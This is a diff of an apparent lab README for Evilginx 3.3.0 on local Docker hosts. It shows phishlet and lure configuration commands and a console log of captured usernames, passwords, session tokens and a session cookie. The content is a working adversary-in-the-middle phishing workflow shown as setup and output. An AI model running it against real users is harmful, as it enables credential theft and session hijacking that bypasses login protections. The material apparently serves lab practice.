@@ -64,38 +64,42 @@ by Kuba Gretzky (@mrgretzky)     version 3.3.0
                                         
 ## Config Evilngnix container
 
-	: config domain evilginx3.local
+	: config domain targetsile.local
 	: config ipv4 172.18.0.10
-	: phishlets hostname targetsite-local evilginx3.local
+	: phishlets hostname targetsite-local targetsile.local
 	: phishlets get-hosts targetsite-local 
-
-		172.18.0.10 login.evilginx3.local
-		172.18.0.10 evilginx3.local
+		172.18.0.10 login.targetsile.local
+		172.18.0.10 targetsile.local
+		
 	: phishlets enable  targetsite-local 
 	: lures create targetsite-local 
 	: lures
+		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
+		| id  |     phishlet      | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |
+		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
+		| 0   | targetsite-local  |           | /AhsTYOfa  |             |               |         | ----  |
+		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
+ 
 	: lures get-url 0
-		
-		https://login.evilginx3.local/eiyTwTXQ
+		https://login.targetsile.local/AhsTYOfa
 
-## Captured the session token
+## Capturing the session token
 ```bash 
-
-: 2024/12/04 16:14:15 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
-[16:14:23] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (10.0.2.15)
-[16:14:23] [inf] [0] [targetsite-local] landing URL: https://login.evilginx3.local/eiyTwTXQ
-[16:15:04] [+++] [0] Username: [adasdas]
-[16:15:04] [+++] [0] Password: [dsdsdsd]
-[16:15:45] [+++] [0] Username: [admin]
-[16:15:45] [+++] [0] Password: [Pwd Sicur@ 123]
-[16:15:45] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
+: 2024/12/04 21:32:08 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
+[21:32:33] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (172.18.0.1)
+[21:32:33] [inf] [0] [targetsite-local] landing URL: https://login.targetsile.local/AhsTYOfa
+[21:33:14] [+++] [0] Username: [admin]
+[21:33:14] [+++] [0] Password: [test01]
+[21:33:53] [+++] [0] Username: [admin]
+[21:33:53] [+++] [0] Password: [Pwd Sicur@ 123]
+[21:33:54] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
 : sessions 
 
-+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+
-| id  |     phishlet      | username  |    password     |  tokens   | remote ip  |       time        |                                                                                                                                      
-+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+                                                                                                                                      
-| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 10.0.2.15  | 2024-12-04 16:15  |                                                                                                                                      
-+-----+-------------------+-----------+-----------------+-----------+------------+-------------------+          
++-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
+| id  |     phishlet      | username  |    password     |  tokens   | remote ip   |       time        |
++-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
+| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 172.18.0.1  | 2024-12-04 21:33  |
++-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
 
 : sessions 1
 
@@ -104,14 +108,17 @@ by Kuba Gretzky (@mrgretzky)     version 3.3.0
  username     : admin
  password     : Pwd Sicur@ 123
  tokens       : captured
- landing url  : https://login.evilginx3.local/eiyTwTXQ
+ landing url  : https://login.targetsile.local/AhsTYOfa
  user-agent   : Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
- remote ip    : 10.0.2.15
- create time  : 2024-12-04 16:14
- update time  : 2024-12-04 16:15
+ remote ip    : 172.18.0.1
+ create time  : 2024-12-04 21:32
+ update time  : 2024-12-04 21:33
 
 [ cookies ]
-[{"path":"/","domain":"login.targetsite.local","expirationDate":1764865104,"value":"sibi2d083ecfn4shbco7i1ro5d--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
+[{"path":"/","domain":"login.targetsite.local","expirationDate":1764884081,"value":"jkncga8d8e6fk3igla22ugsfse--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
+
+
+
 
 ```
 ## useful Docker commands
